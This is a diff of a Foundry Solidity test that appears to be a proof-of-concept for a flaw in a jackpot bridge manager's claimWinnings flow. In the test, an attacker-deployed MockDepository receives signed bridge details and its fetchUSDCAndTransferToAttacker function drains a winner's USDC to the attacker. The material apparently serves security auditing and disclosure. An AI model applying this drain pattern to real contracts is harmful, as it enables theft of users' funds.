@@ -10,7 +10,7 @@ import {ScaledEntropyProvider} from "contracts/ScaledEntropyProvider.sol";
 import {ScaledEntropyProviderMock} from "contracts/mocks/ScaledEntropyProviderMock.sol";
 import {JackpotBridgeManager} from "contracts/JackpotBridgeManager.sol";
 import {EntropyMock} from "contracts/mocks/EntropyMock.sol";
-
+import {IScaledEntropyProvider} from "contracts/interfaces/IScaledEntropyProvider.sol";
 import {Test, console2} from "forge-std/Test.sol";
 
 contract JackpotBridgeManagerTest is Test {
@@ -35,6 +35,7 @@ contract JackpotBridgeManagerTest is Test {
     uint256 ticketPrice = 1e6;
     uint256 maxReferrers = 5;
     uint32 entropyBaseGasLimit = 10000000;
+    uint32 entropyVariableGasLimit = 250000;
     uint256 entropyFee = 0.00005e18;
     uint256 minimumPayout = 1e6;
     uint256 premiumTierMinAllocation = 0.2e18;
@@ -172,16 +173,15 @@ contract JackpotBridgeManagerTest is Test {
         uint256[] memory referrerSplits;
 
         vm.prank(owner);
-        uint256[] memory ticketIds = jackpotBridgeManager.buyTickets(tickets, recipient, referrers, referrerSplits, source);
+        uint256[] memory ticketIds =
+            jackpotBridgeManager.buyTickets(tickets, recipient, referrers, referrerSplits, source);
 
         vm.warp(block.timestamp + drawingDurationInSeconds + 1);
 
         Jackpot.DrawingState memory drawingState = jackpot.getDrawingState(1);
-
         vm.startPrank(owner);
-        uint256 value =  162500000000000;
-        //entropyFee + (entropyBaseGasLimit + 500000 * drawingState.bonusballMax);
-        console2.log("Value: ", value);
+        uint256 value =
+            entropyFee + uint128(entropyBaseGasLimit + entropyVariableGasLimit * drawingState.bonusballMax) * 1e7;
         jackpot.runJackpot{value: value}();
         uint256[][] memory randomNumbers = new uint256[][](2);
         uint256[] memory randomNormals = new uint256[](5);
@@ -197,41 +197,35 @@ contract JackpotBridgeManagerTest is Test {
         randomNumbers[0] = randomNormals;
         randomNumbers[1] = randomBonusBall;
 
-
         scaledEntropyProvider.randomnessCallback(randomNumbers);
 
         vm.stopPrank();
-
-        uint256 rawUserWinnings = payoutCalculator.getTierPayout(1, 1) + payoutCalculator.getTierPayout(1, 11);
-        // uint256 referrerShare = _winningAmount * _referralWinShare / PRECISE_UNIT;
-        // uint256 expectedUserWinnings = (rawUserWinnings *  (PRECISE_UNIT - referralWinShare) /
-        // PRECISE_UNIT) ;
-
-        uint256 expectedWinnings = 296402;
-
+        uint256 expectedWinnings;
+        uint256[] memory tierIds = jackpot.getTicketTierIds(ticketIds);
+        for (uint256 i; i < ticketIds.length; i++) {
+            uint256 rawWinnings = payoutCalculator.getTierPayout(1, tierIds[i]);
+            uint256 referralShare = rawWinnings * referralWinShare / PRECISE_UNIT;
+            expectedWinnings += rawWinnings - referralShare;
+        }
         IJackpot.Ticket[] memory ticketsCopy = tickets;
         address attacker = makeAddr("attacker");
         vm.prank(attacker);
-        MockDepository depository = new MockDepository(address(usdcMock), address(jackpotBridgeManager), expectedWinnings);
+        MockDepository depository =
+            new MockDepository(address(usdcMock), address(jackpotBridgeManager), expectedWinnings);
 
         JackpotBridgeManager.RelayTxData memory bridgeDetails = JackpotBridgeManager.RelayTxData({
             approveTo: address(depository),
             to: address(depository),
             data: abi.encodeCall(MockDepository.fetchUSDCAndTransferToAttacker, ())
         });
-        // uint256[] memory ticketIds = jackpotBridgeManager.getUserTickets(buyerOne, 1);
-        bytes32 digest = jackpotBridgeManager.createClaimWinningsEIP712Hash(ticketIds,
-        bridgeDetails);
 
-      (uint8 v, bytes32 r, bytes32 s) = vm.sign(buyerOnePrivateKey, digest);
-    bytes memory signature = abi.encodePacked(r, s, v);
+        bytes32 digest = jackpotBridgeManager.createClaimWinningsEIP712Hash(ticketIds, bridgeDetails);
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(buyerOnePrivateKey, digest);
+        bytes memory signature = abi.encodePacked(r, s, v);
 
         vm.prank(owner);
         jackpotBridgeManager.claimWinnings(ticketIds, bridgeDetails, signature);
-
-        
-        jackpotBridgeManager.claimTickets(ticketIds, buyerOne, signature);
-
     }
 }
 
@@ -247,8 +241,9 @@ contract MockDepository {
         bridgeManager = _bridgeManager;
         expectedAmount = _expectedAmount;
     }
+
     function fetchUSDCAndTransferToAttacker() external {
-            usdcMock.transferFrom(msg.sender, address(this), expectedAmount);
-            usdcMock.transfer(attacker, usdcMock.balanceOf(address(this)));
+        usdcMock.transferFrom(msg.sender, address(this), expectedAmount);
+        usdcMock.transfer(attacker, usdcMock.balanceOf(address(this)));
     }
 }
